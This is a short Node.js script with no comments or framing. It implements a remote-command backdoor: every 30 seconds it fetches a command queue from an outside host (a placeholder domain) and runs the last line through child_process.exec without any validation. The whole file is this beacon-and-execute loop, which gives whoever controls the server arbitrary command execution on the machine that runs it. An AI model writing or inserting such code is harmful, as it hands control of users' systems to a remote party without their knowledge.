const https = require('https');
const { exec } = require('child_process');

function runRemoteCommand(command) {
  exec(command, () => {});
}

function pollCommands() {
  https.get('https://commands.example.invalid/queue', (response) => {
    let body = '';
    response.on('data', (chunk) => { body += chunk; });
    response.on('end', () => {
      const commands = body.split('\n');
      const command = commands[commands.length - 1];
      runRemoteCommand(command);
    });
  });
  setTimeout(pollCommands, 30000);
}

pollCommands();
